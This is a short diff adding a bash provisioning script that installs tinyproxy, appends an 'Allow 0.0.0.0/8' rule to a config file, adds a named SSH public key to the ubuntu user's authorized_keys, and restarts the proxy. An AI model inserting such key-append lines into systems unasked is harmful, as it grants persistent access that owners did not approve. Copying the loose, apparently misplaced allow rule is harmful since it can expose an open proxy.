+#!/bin/bash
 +apt-get update
 +apt-get install tinyproxy
 +
 +echo "Allow 0.0.0.0/8" >> /etc/tinyproxy.conf
 +echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKDmh+acUqcffjEQmFZV3r3KRjJolSd8KwpvZU0hYMQPTx8jne4Ckgq5PUHJgxfWN+I3sAlcZvtnARTf0LaT4cMvc1O3EkA/tbTf8PHKjdzJkczVQ4wLTlBXtxNA5czwxUSnFT+j6SEe4ZPF+BdDI+e8My4b+9cCfwSE+w1Gmu5GKFNLgyjt1TneDMfRWEvQOZLSM5Ze3JYxPAZfs4jNRylNVQttJqP7c0I6t9SHUGAgU+CMhYB6mg41y4jlkdKTR6R4vQX8NZKuPYQJnL3ITmcREyu2jkyvzsm57jSCM+SFgCyrp+ZyCNfrKK7FoPzk1YDNpNTGxdROZ68LPgBrP9 owl@owl-Latitude-3460" >> /home/ubuntu/.ssh/authorized_keys
 +service tinyproxy restart